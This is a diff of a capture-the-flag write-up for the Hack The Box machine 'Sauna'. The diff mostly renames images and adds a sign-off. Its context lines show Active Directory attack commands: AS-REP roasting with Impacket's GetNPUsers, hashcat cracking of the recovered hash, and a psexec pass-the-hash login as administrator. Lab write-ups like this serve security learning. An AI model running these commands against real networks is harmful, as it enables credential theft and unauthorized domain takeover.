@@ -7,7 +7,7 @@ cover: >-
 coverY: -56.01639344262295
 ---
 
-# 🧖‍♂️ Sauna
+# 🧖‍♂️ Sauna (10.10.10.175)
 
 ## Scanning
 
@@ -107,7 +107,7 @@ To perform this attack, we'll need to use one of Impacket's tools, known as "_Ge
 GetNPUsers.py egotistical-bank.local/fsmith -format hashcat -dc-ip 10.10.10.175
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>fsmith's AS-REP hash</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>fsmith's AS-REP hash</p></figcaption></figure>
 
 Now we can take this hash and try to crack it with "_hashcat_":
 
@@ -115,7 +115,7 @@ Now we can take this hash and try to crack it with "_hashcat_":
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>fsmith's password</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>fsmith's password</p></figcaption></figure>
 
 ### User Flag
 
@@ -212,3 +212,9 @@ psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b514
 Once we have system on the machine, we can simply navigate to the Administrator's desktop, where we'll find the Root Flag:
 
 <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Root Flag</p></figcaption></figure>
+
+And this was the CTF!&#x20;
+
+Thank you so much for taking the time to read my WriteUp!
+
+See you in another box!
